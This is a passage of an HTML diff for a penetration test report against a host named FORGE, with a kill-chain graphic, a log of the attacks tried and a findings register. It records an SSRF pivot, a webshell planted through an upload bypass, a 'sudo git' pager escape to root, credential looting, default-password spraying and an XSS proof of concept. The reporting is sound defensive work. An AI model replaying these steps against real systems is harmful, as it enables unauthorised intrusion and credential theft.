+          <div style="flex-shrink:0;width:28px;height:28px;border-radius:50%;background:var(--sev-low);color:#fff;font-size:0.72rem;font-weight:700;display:flex;align-items:center;justify-content:center;">V</div>
+          <div>
+            <div style="font-weight:700;font-size:var(--fs-small);color:var(--ink-mid);margin-bottom:0.2rem;">Validate — Issue-Validator Gate</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);line-height:1.55;">A finding only ships when it passes the ARGUS Issue-Validator: the exploit must be reproducible, the evidence must be concrete, and the CVSS vector must be defensible. No theoretical or unconfirmed findings are raised.</div>
+          </div>
+        </div>
+        <div style="display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;background:var(--surface-warm);">
+          <div style="flex-shrink:0;width:28px;height:28px;border-radius:50%;background:var(--sev-info);color:#fff;font-size:0.72rem;font-weight:700;display:flex;align-items:center;justify-content:center;">R</div>
+          <div>
+            <div style="font-weight:700;font-size:var(--fs-small);color:var(--ink-mid);margin-bottom:0.2rem;">Retest — Remediation Verification</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);line-height:1.55;">After the client remediates, ARGUS retests each finding and updates its status (Open / Verified-Fixed / Re-confirmed). Retest results are recorded in the register and the residual risk column.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="callout callout-info" style="margin-top:1.2rem;">
+        <div class="callout-title">MITRE Annotation Policy</div>
+        Every offensive action is tagged with one or more MITRE ATT&amp;CK technique IDs at execution time. This enables direct mapping to defensive controls, detection opportunities, and threat-intelligence enrichment without post-hoc retro-fitting.
+      </div>
+    </div>
+
+    <div>
+      <h3 style="font-family:'Fraunces',serif;font-size:1rem;font-weight:700;color:var(--brand);margin-bottom:0.9rem;">CVSS v3.1 Scoring Bands</h3>
+
+      <div style="display:flex;flex-direction:column;gap:0.5rem;margin-bottom:1.5rem;">
+        <div style="display:flex;align-items:center;gap:0.8rem;padding:0.7rem 1rem;background:var(--sev-critical-bg);border:1px solid rgba(192,57,43,0.2);border-radius:var(--r-md);">
+          <span class="sev sev-critical" style="min-width:68px;justify-content:center;">Critical</span>
+          <div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:700;color:var(--sev-critical);">9.0 – 10.0</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);">Exploitable remotely with no auth; full system impact likely</div>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:0.8rem;padding:0.7rem 1rem;background:var(--sev-high-bg);border:1px solid rgba(211,84,0,0.2);border-radius:var(--r-md);">
+          <span class="sev sev-high" style="min-width:68px;justify-content:center;">High</span>
+          <div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:700;color:var(--sev-high);">7.0 – 8.9</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);">Significant impact; may require low-privilege access or interaction</div>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:0.8rem;padding:0.7rem 1rem;background:var(--sev-medium-bg);border:1px solid rgba(183,119,13,0.2);border-radius:var(--r-md);">
+          <span class="sev sev-medium" style="min-width:68px;justify-content:center;">Medium</span>
+          <div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:700;color:var(--sev-medium);">4.0 – 6.9</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);">Moderate impact; limited scope or requires user interaction</div>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:0.8rem;padding:0.7rem 1rem;background:var(--sev-low-bg);border:1px solid rgba(26,107,60,0.2);border-radius:var(--r-md);">
+          <span class="sev sev-low" style="min-width:68px;justify-content:center;">Low</span>
+          <div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:700;color:var(--sev-low);">0.1 – 3.9</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);">Minimal impact; hardening/hygiene items</div>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:0.8rem;padding:0.7rem 1rem;background:var(--sev-info-bg);border:1px solid rgba(26,82,118,0.15);border-radius:var(--r-md);">
+          <span class="sev sev-info" style="min-width:68px;justify-content:center;">Info</span>
+          <div>
+            <div style="font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:700;color:var(--sev-info);">0.0</div>
+            <div style="font-size:var(--fs-micro);color:var(--ink-light);">Observations; no direct exploitability; context-dependent risk</div>
+          </div>
+        </div>
+      </div>
+
+      <h3 style="font-family:'Fraunces',serif;font-size:1rem;font-weight:700;color:var(--brand);margin-bottom:0.7rem;">Tooling Used</h3>
+      <div style="display:flex;flex-wrap:wrap;gap:0.4rem;">
+        <span class="tag">nmap</span><span class="tag">gobuster</span><span class="tag">nikto</span><span class="tag">sqlmap</span>
+        <span class="tag">hydra</span><span class="tag">burp suite</span><span class="tag">curl</span><span class="tag">linpeas</span>
+        <span class="tag">gtfobins</span><span class="tag">custom payloads</span><span class="tag">argus-validator</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §04 — ATTACK-PATH / KILL-CHAIN GRAPH
+═══════════════════════════════════════════ -->
+<section class="section section-alt page-break" id="killchain">
+  <div class="section-numeral">04</div>
+  <div class="section-label">Attack Path</div>
+  <h2 class="section-title">Attack Path &amp; Kill-Chain Graph</h2>
+  <p class="section-lead">The complete exploitation chain from external recon to root — each node color-coded by severity, annotated with MITRE technique IDs.</p>
+  <div class="section-rule"></div>
+
+  <div class="killchain-wrap avoid-break">
+    <svg viewBox="0 0 820 420" xmlns="http://www.w3.org/2000/svg" style="width:100%;min-width:600px;display:block;">
+      <defs>
+        <!-- Arrow markers -->
+        <marker id="kc-arr-red" markerWidth="9" markerHeight="9" refX="7" refY="3.5" orient="auto">
+          <path d="M0,0 L0,7 L9,3.5 z" fill="#C0392B"/>
+        </marker>
+        <marker id="kc-arr-orange" markerWidth="9" markerHeight="9" refX="7" refY="3.5" orient="auto">
+          <path d="M0,0 L0,7 L9,3.5 z" fill="#D35400"/>
+        </marker>
+        <marker id="kc-arr-gold" markerWidth="9" markerHeight="9" refX="7" refY="3.5" orient="auto">
+          <path d="M0,0 L0,7 L9,3.5 z" fill="#B8960C"/>
+        </marker>
+        <marker id="kc-arr-green" markerWidth="9" markerHeight="9" refX="7" refY="3.5" orient="auto">
+          <path d="M0,0 L0,7 L9,3.5 z" fill="#27ae60"/>
+        </marker>
+        <filter id="glow-red" x="-20%" y="-20%" width="140%" height="140%">
+          <feGaussianBlur stdDeviation="3" result="blur"/>
+          <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+        <filter id="glow-green" x="-20%" y="-20%" width="140%" height="140%">
+          <feGaussianBlur stdDeviation="4" result="blur"/>
+          <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+        </filter>
+      </defs>
+
+      <!-- Background -->
+      <rect width="820" height="420" fill="#12121F" rx="10"/>
+
+      <!-- Phase labels (top) -->
+      <text x="60"  y="28" fill="#4A4A6A" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1.5">RECON</text>
+      <text x="195" y="28" fill="#4A4A6A" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1.5">ENUM</text>
+      <text x="345" y="28" fill="#4A4A6A" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1.5">INITIAL ACCESS</text>
+      <text x="510" y="28" fill="#4A4A6A" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1.5">EXECUTION</text>
+      <text x="650" y="28" fill="#4A4A6A" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1.5">PRIVESC</text>
+      <text x="775" y="28" fill="#4A4A6A" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle" letter-spacing="1.5">IMPACT</text>
+
+      <!-- Phase dividers -->
+      <line x1="130" y1="35" x2="130" y2="410" stroke="#2A2A42" stroke-width="1" stroke-dasharray="3,4"/>
+      <line x1="262" y1="35" x2="262" y2="410" stroke="#2A2A42" stroke-width="1" stroke-dasharray="3,4"/>
+      <line x1="422" y1="35" x2="422" y2="410" stroke="#2A2A42" stroke-width="1" stroke-dasharray="3,4"/>
+      <line x1="578" y1="35" x2="578" y2="410" stroke="#2A2A42" stroke-width="1" stroke-dasharray="3,4"/>
+      <line x1="710" y1="35" x2="710" y2="410" stroke="#2A2A42" stroke-width="1" stroke-dasharray="3,4"/>
+
+      <!-- ── NODE HELPER: rounded rects with labels ── -->
+
+      <!-- NODE 1: External Attacker -->
+      <rect x="10" y="55" width="108" height="52" rx="7" fill="#1C1C2E" stroke="#4A4A7A" stroke-width="1.5"/>
+      <text x="64" y="76" fill="#aaa" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">EXTERNAL</text>
+      <text x="64" y="90" fill="#666" font-size="8" font-family="Inter,sans-serif" text-anchor="middle">ARGUS / Attacker</text>
+      <circle cx="64" cy="100" r="2.5" fill="#4A4A7A"/>
+
+      <!-- NODE 2: Port Scan (nmap) -->
+      <rect x="142" y="44" width="108" height="52" rx="7" fill="#1E2040" stroke="#2980b9" stroke-width="1.5"/>
+      <text x="196" y="65" fill="#7eb8f7" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">nmap -sCV</text>
+      <text x="196" y="79" fill="#5a8ab0" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">3 ports fingerprinted</text>
+      <text x="196" y="90" fill="#2C5A7A" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">:22 :80 :8080</text>
+
+      <!-- NODE 3: Web Enum (gobuster) -->
+      <rect x="142" y="116" width="108" height="52" rx="7" fill="#1E2040" stroke="#2980b9" stroke-width="1.5"/>
+      <text x="196" y="137" fill="#7eb8f7" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">gobuster</text>
+      <text x="196" y="151" fill="#5a8ab0" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">/admin /upload</text>
+      <text x="196" y="162" fill="#5a8ab0" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">/api /search</text>
+
+      <!-- NODE 4: SSRF /api/fetch — CRITICAL -->
+      <rect x="278" y="55" width="132" height="60" rx="7" fill="#2A0C0C" stroke="#C0392B" stroke-width="2" filter="url(#glow-red)"/>
+      <text x="344" y="77" fill="#ff6b6b" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">SSRF · /api/fetch</text>
+      <text x="344" y="91" fill="#c0392b" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">T1190 · CVSS 9.1</text>
+      <text x="344" y="105" fill="#8a2a2a" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">→ 127.0.0.1:8080</text>
+
+      <!-- NODE 5: Internal Admin (:8080) -->
+      <rect x="278" y="140" width="132" height="52" rx="7" fill="#251C06" stroke="#B8960C" stroke-width="1.5"/>
+      <text x="344" y="161" fill="#f39c12" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">Internal Admin</text>
+      <text x="344" y="175" fill="#8a6a00" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">127.0.0.1:8080 · Werkzeug</text>
+      <text x="344" y="186" fill="#6a5000" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">Reached via SSRF pivot</text>
+
+      <!-- NODE 6: Upload Bypass + Webshell — CRITICAL -->
+      <rect x="435" y="55" width="132" height="68" rx="7" fill="#2A0C0C" stroke="#C0392B" stroke-width="2" filter="url(#glow-red)"/>
+      <text x="501" y="77" fill="#ff6b6b" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">Upload Bypass</text>
+      <text x="501" y="91" fill="#ff6b6b" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">→ Webshell</text>
+      <text x="501" y="105" fill="#c0392b" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">T1505.003 · CVSS 9.8</text>
+      <text x="501" y="117" fill="#8a2a2a" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">shell.php.jpg · magic-byte</text>
+
+      <!-- NODE 7: RCE www-data (FOOTHOLD) -->
+      <rect x="435" y="148" width="132" height="60" rx="7" fill="#2A1800" stroke="#D35400" stroke-width="1.5"/>
+      <text x="501" y="170" fill="#e67e22" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">RCE · www-data</text>
+      <text x="501" y="184" fill="#c0392b" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">T1059 · FOOTHOLD</text>
+      <text x="501" y="197" fill="#8a5000" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">uid=33(www-data)</text>
+
+      <!-- NODE 8: LinPEAS -->
+      <rect x="435" y="236" width="132" height="48" rx="7" fill="#1E2040" stroke="#2980b9" stroke-width="1.5"/>
+      <text x="501" y="257" fill="#7eb8f7" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">LinPEAS</text>
+      <text x="501" y="271" fill="#5a8ab0" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">sudo NOPASSWD git found</text>
+      <text x="501" y="280" fill="#3a5a6a" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">T1083 Discovery</text>
+
+      <!-- NODE 9: sudo git GTFOBins — HIGH -->
+      <rect x="592" y="110" width="110" height="68" rx="7" fill="#250D00" stroke="#D35400" stroke-width="2"/>
+      <text x="647" y="133" fill="#e67e22" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">sudo git</text>
+      <text x="647" y="147" fill="#e67e22" font-size="9" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">GTFOBins</text>
+      <text x="647" y="161" fill="#a04a00" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">T1548.003 · CVSS 8.8</text>
+      <text x="647" y="171" fill="#7a3a00" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">!/bin/sh escape</text>
+
+      <!-- NODE 10: ROOT — green glow -->
+      <rect x="722" y="95" width="88" height="70" rx="7" fill="#0A1F0A" stroke="#27ae60" stroke-width="2.5" filter="url(#glow-green)"/>
+      <text x="766" y="118" fill="#2ecc71" font-size="11" font-family="Fraunces,serif" font-weight="900" text-anchor="middle">ROOT</text>
+      <text x="766" y="134" fill="#27ae60" font-size="8" font-family="Inter,sans-serif" text-anchor="middle">uid=0</text>
+      <text x="766" y="146" fill="#1a6b3c" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">Full Compromise</text>
+      <text x="766" y="158" fill="#1a4a2a" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">T1003 Cred Access</text>
+
+      <!-- NODE 11: Loot -->
+      <rect x="722" y="188" width="88" height="80" rx="7" fill="#1C1C2E" stroke="#B8960C" stroke-width="1.5"/>
+      <text x="766" y="208" fill="#B8960C" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">LOOT</text>
+      <text x="766" y="222" fill="#8a6a00" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">user.txt</text>
+      <text x="766" y="234" fill="#8a6a00" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">root.txt</text>
+      <text x="766" y="246" fill="#8a6a00" font-size="7.5" font-family="Inter,sans-serif" text-anchor="middle">id_rsa</text>
+      <text x="766" y="258" fill="#6a5000" font-size="7" font-family="Inter,sans-serif" text-anchor="middle">config.php</text>
+
+      <!-- ── ARROWS ── -->
+      <!-- Attacker → nmap -->
+      <line x1="118" y1="71" x2="141" y2="71" stroke="#2980b9" stroke-width="1.5" marker-end="url(#kc-arr-gold)"/>
+      <!-- Attacker → gobuster -->
+      <path d="M118 81 Q130 143 141 143" stroke="#2980b9" stroke-width="1.5" fill="none" marker-end="url(#kc-arr-gold)"/>
+      <!-- nmap → SSRF -->
+      <line x1="250" y1="71" x2="277" y2="80" stroke="#C0392B" stroke-width="1.5" marker-end="url(#kc-arr-red)"/>
+      <!-- gobuster → SSRF -->
+      <path d="M250 143 Q265 120 277 92" stroke="#C0392B" stroke-width="1.5" fill="none" marker-end="url(#kc-arr-red)"/>
+      <!-- SSRF → Internal Admin -->
+      <line x1="344" y1="115" x2="344" y2="139" stroke="#B8960C" stroke-width="1.5" marker-end="url(#kc-arr-gold)"/>
+      <!-- SSRF → Upload (main attack) -->
+      <line x1="410" y1="80" x2="434" y2="82" stroke="#C0392B" stroke-width="2" marker-end="url(#kc-arr-red)"/>
+      <!-- Internal Admin → Upload (discovered via SSRF) -->
+      <path d="M410 166 Q425 140 434 108" stroke="#B8960C" stroke-width="1.5" fill="none" stroke-dasharray="4,3" marker-end="url(#kc-arr-gold)"/>
+      <!-- Upload → RCE -->
+      <line x1="501" y1="123" x2="501" y2="147" stroke="#D35400" stroke-width="1.5" marker-end="url(#kc-arr-orange)"/>
+      <!-- RCE → LinPEAS -->
+      <line x1="501" y1="208" x2="501" y2="235" stroke="#2980b9" stroke-width="1.5" marker-end="url(#kc-arr-gold)"/>
+      <!-- LinPEAS → sudo git -->
+      <path d="M567 258 Q600 258 600 212 L600 178" stroke="#D35400" stroke-width="1.5" fill="none" marker-end="url(#kc-arr-orange)"/>
+      <!-- RCE → sudo git (short) -->
+      <line x1="567" y1="174" x2="591" y2="158" stroke="#D35400" stroke-width="1.5" marker-end="url(#kc-arr-orange)"/>
+      <!-- sudo git → ROOT -->
+      <line x1="702" y1="140" x2="721" y2="135" stroke="#27ae60" stroke-width="2" marker-end="url(#kc-arr-green)"/>
+      <!-- ROOT → Loot -->
+      <line x1="766" y1="165" x2="766" y2="187" stroke="#B8960C" stroke-width="1.5" marker-end="url(#kc-arr-gold)"/>
+
+      <!-- Reconfirmed badge -->
+      <rect x="290" y="310" width="140" height="30" rx="5" fill="#0A2A0A" stroke="#27ae60" stroke-width="1"/>
+      <text x="360" y="330" fill="#27ae60" font-size="8.5" font-family="Inter,sans-serif" font-weight="700" text-anchor="middle">&#10003; Re-confirmed on Retest</text>
+
+      <!-- Legend bottom -->
+      <circle cx="22" cy="385" r="5" fill="#C0392B"/>
+      <text x="32" y="389" fill="#777" font-size="8" font-family="Inter,sans-serif">Critical path (exploited)</text>
+      <circle cx="195" cy="385" r="5" fill="#D35400"/>
+      <text x="205" y="389" fill="#777" font-size="8" font-family="Inter,sans-serif">High severity</text>
+      <circle cx="310" cy="385" r="5" fill="#B8960C"/>
+      <text x="320" y="389" fill="#777" font-size="8" font-family="Inter,sans-serif">Pivot / Discovery</text>
+      <circle cx="420" cy="385" r="5" fill="#2980b9"/>
+      <text x="430" y="389" fill="#777" font-size="8" font-family="Inter,sans-serif">Reconnaissance</text>
+      <circle cx="540" cy="385" r="5" fill="#27ae60"/>
+      <text x="550" y="389" fill="#777" font-size="8" font-family="Inter,sans-serif">Root / Objective reached</text>
+    </svg>
+  </div>
+
+  <div class="callout callout-gold" style="margin-top:1.2rem;">
+    <div class="callout-title">Kill-Chain Narrative</div>
+    <strong>External → [T1190] SSRF /api/fetch → internal admin 127.0.0.1:8080 → [T1505.003] upload filter bypass → webshell → [T1059] RCE www-data (FOOTHOLD) → [T1548.003] sudo git GTFOBins → ROOT → [T1003] id_rsa + credentials looted.</strong> The chain was executed without authentication at any stage. Re-confirmed on retest 19 Jun 2026 09:00.
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════════
+     §05 — ATTACKS ATTEMPTED — COVERAGE LOG
+═══════════════════════════════════════════ -->
+<section class="section" id="attacks-attempted">
+  <div class="section-numeral">05</div>
+  <div class="section-label">Coverage Log</div>
+  <h2 class="section-title">Attacks Attempted — Coverage Log</h2>
+  <p class="section-lead">Every offensive action taken — exploitable and non-exploitable alike — logged for full audit transparency.</p>
+  <div class="section-rule"></div>
+
+  <div class="data-table-wrap avoid-break">
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th style="width:32px;">#</th>
+          <th>Tool / Technique</th>
+          <th>Target</th>
+          <th>Outcome</th>
+          <th>Exploitable?</th>
+          <th>Notes / Finding</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="col-id">01</td>
+          <td style="font-weight:600;color:var(--ink);">nmap -sCV port scan</td>
+          <td><code>10.129.21.254</code></td>
+          <td><span class="outcome outcome-success">&#10003; Success</span></td>
+          <td><span class="sev sev-info">Recon</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">3 ports fingerprinted: :22 OpenSSH 8.2p1 · :80 Apache 2.4.41 · :8080 Werkzeug/2.0</td>
+        </tr>
+        <tr>
+          <td class="col-id">02</td>
+          <td style="font-weight:600;color:var(--ink);">gobuster dir enum</td>
+          <td><code>:80/</code></td>
+          <td><span class="outcome outcome-success">&#10003; Success</span></td>
+          <td><span class="sev sev-info">Recon</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">Discovered /admin (403), /upload, /api, /search</td>
+        </tr>
+        <tr>
+          <td class="col-id">03</td>
+          <td style="font-weight:600;color:var(--ink);">nikto web scan</td>
+          <td><code>:80/</code></td>
+          <td><span class="outcome outcome-success">&#10003; Success</span></td>
+          <td><span class="sev sev-info">Info</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">Outdated Apache flagged · missing security headers · HTTP TRACE enabled → F-04, F-06, F-07</td>
+        </tr>
+        <tr style="background:var(--surface-cool);">
+          <td class="col-id">04</td>
+          <td style="font-weight:600;color:var(--ink);">sqlmap /api?id= (1,200 req)</td>
+          <td><code>:80/api?id=</code></td>
+          <td><span class="outcome outcome-failed">&#10007; Negative</span></td>
+          <td><span class="sev sev-ne">Non-Exploitable</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">Parameter is integer-cast server-side; no injection point found despite exhaustive payload set</td>
+        </tr>
+        <tr style="background:var(--surface-cool);">
+          <td class="col-id">05</td>
+          <td style="font-weight:600;color:var(--ink);">hydra SSH root brute-force</td>
+          <td><code>:22</code></td>
+          <td><span class="outcome outcome-blocked">&#9632; Blocked</span></td>
+          <td><span class="sev sev-ne">Non-Exploitable</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">Rate-limiting engaged after 5 attempts; service is key-auth only — password auth disabled</td>
+        </tr>
+        <tr style="background:var(--surface-cool);">
+          <td class="col-id">06</td>
+          <td style="font-weight:600;color:var(--ink);">Default credential spray /login</td>
+          <td><code>:80/login</code></td>
+          <td><span class="outcome outcome-failed">&#10007; Failed</span></td>
+          <td><span class="sev sev-ne">Non-Exploitable</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">admin:admin, admin:password, forge:forge et al. — all rejected with 401</td>
+        </tr>
+        <tr style="background:var(--surface-cool);">
+          <td class="col-id">07</td>
+          <td style="font-weight:600;color:var(--ink);">CSRF token test (form actions)</td>
+          <td><code>:80/</code></td>
+          <td><span class="outcome outcome-failed">&#10007; Negative</span></td>
+          <td><span class="sev sev-ne">Non-Exploitable</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">CSRF tokens enforced on all state-changing endpoints; no bypass found</td>
+        </tr>
+        <tr>
+          <td class="col-id">08</td>
+          <td style="font-weight:600;color:var(--sev-critical);">SSRF /api/fetch?url=</td>
+          <td><code>:80/api/fetch</code></td>
+          <td><span class="outcome outcome-exploit">&#9650; Exploitable</span></td>
+          <td><span class="sev sev-critical">Critical</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">Reached 127.0.0.1:8080 internal admin — no egress allow-list. <strong>→ F-01</strong></td>
+        </tr>
+        <tr>
+          <td class="col-id">09</td>
+          <td style="font-weight:600;color:var(--sev-critical);">Upload bypass (shell.php.jpg + magic)</td>
+          <td><code>:80/upload</code></td>
+          <td><span class="outcome outcome-exploit">&#9650; Exploitable</span></td>
+          <td><span class="sev sev-critical">Critical</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">Webshell planted at /uploads/shell.php.jpg — extension-only filter bypassed. <strong>→ F-02</strong></td>
+        </tr>
+        <tr>
+          <td class="col-id">10</td>
+          <td style="font-weight:600;color:var(--sev-critical);">Webshell RCE — id command</td>
+          <td><code>:80/uploads/shell.php.jpg</code></td>
+          <td><span class="outcome outcome-exploit">&#9650; Exploitable</span></td>
+          <td><span class="sev sev-critical">Critical</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">uid=33(www-data) gid=33(www-data); /etc/passwd read confirmed. <strong>→ F-02</strong></td>
+        </tr>
+        <tr>
+          <td class="col-id">11</td>
+          <td style="font-weight:600;color:var(--sev-high);">LinPEAS local enumeration</td>
+          <td><code>FORGE (shell)</code></td>
+          <td><span class="outcome outcome-success">&#10003; Success</span></td>
+          <td><span class="sev sev-high">High lead</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">sudo NOPASSWD /usr/bin/git identified for www-data — direct privesc vector. <strong>→ F-03</strong></td>
+        </tr>
+        <tr>
+          <td class="col-id">12</td>
+          <td style="font-weight:600;color:var(--sev-high);">sudo git -p help → !/bin/sh</td>
+          <td><code>FORGE (shell)</code></td>
+          <td><span class="outcome outcome-exploit">&#9650; Exploitable</span></td>
+          <td><span class="sev sev-high">High</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">GTFOBins pager escape — uid=0(root) confirmed immediately. <strong>→ F-03</strong></td>
+        </tr>
+        <tr>
+          <td class="col-id">13</td>
+          <td style="font-weight:600;color:var(--sev-medium);">Reflected XSS /search?q=</td>
+          <td><code>:80/search</code></td>
+          <td><span class="outcome outcome-medium">&#9670; Exploitable</span></td>
+          <td><span class="sev sev-medium">Medium</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">User-supplied input reflected without encoding; PoC &lt;script&gt;alert(1)&lt;/script&gt; executes. <strong>→ F-05</strong></td>
+        </tr>
+        <tr>
+          <td class="col-id">14</td>
+          <td style="font-weight:600;color:var(--ink);">TLS protocol scan</td>
+          <td><code>:443</code></td>
+          <td><span class="outcome outcome-success">&#10003; Success</span></td>
+          <td><span class="sev sev-low">Low</span></td>
+          <td style="font-size:var(--fs-micro);color:var(--ink-light);">TLS 1.0 and 1.1 enabled — deprecated, downgrade attack surface. <strong>→ F-08</strong></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div style="margin-top:1rem;display:flex;flex-wrap:wrap;gap:1rem;align-items:center;">
+    <div style="font-size:var(--fs-micro);color:var(--ink-faint);font-weight:600;letter-spacing:0.1em;text-transform:uppercase;">Outcome Legend:</div>
+    <span class="outcome outcome-exploit">&#9650; Exploitable</span>
+    <span class="outcome outcome-success">&#10003; Success (Recon/Info)</span>
+    <span class="outcome outcome-medium">&#9670; Exploitable (Medium)</span>
+    <span class="outcome outcome-failed">&#10007; Failed / Negative</span>
+    <span class="outcome outcome-blocked">&#9632; Blocked / Rate-limited</span>
+    <span class="sev sev-ne">Non-Exploitable</span>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §06 — FINDINGS REGISTER
+═══════════════════════════════════════════ -->
+<section class="section section-alt page-break" id="findings-register">
+  <div class="section-numeral">06</div>
+  <div class="section-label">Findings Register</div>
+  <h2 class="section-title">Findings Register</h2>
+  <p class="section-lead">All 14 findings tabulated — severity color-coded, CVSS scored, MITRE-mapped, and retest-status tracked.</p>
+  <div class="section-rule"></div>
+
+  <div class="data-table-wrap">
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Finding</th>
+          <th>Severity</th>
+          <th style="text-align:center;">CVSS</th>
+          <th>Host</th>
+          <th>MITRE</th>
+          <th>Retest</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- Critical -->
+        <tr>
+          <td class="col-id">F-01</td>
+          <td style="font-weight:600;color:var(--ink);">SSRF → Internal Admin (Unauthenticated)</td>
+          <td><span class="sev sev-critical">Critical</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-critical);">9.1</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">T1190</td>
+          <td><span class="badge-verified" style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);">Re-confirmed</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-02</td>
+          <td style="font-weight:600;color:var(--ink);">Unauth File Upload → Remote Code Execution</td>
+          <td><span class="sev sev-critical">Critical</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-critical);">9.8</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">T1505.003 / T1059</td>
+          <td><span class="badge-verified" style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);">Re-confirmed</span></td>
+        </tr>
+        <!-- High -->
+        <tr>
+          <td class="col-id">F-03</td>
+          <td style="font-weight:600;color:var(--ink);">Sudo NOPASSWD git → Privilege Escalation to Root</td>
+          <td><span class="sev sev-high">High</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-high);">8.8</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE</td>
+          <td class="col-mitre">T1548.003</td>
+          <td><span class="badge-verified" style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);">Re-confirmed</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-04</td>
+          <td style="font-weight:600;color:var(--ink);">Outdated Apache httpd 2.4.41</td>
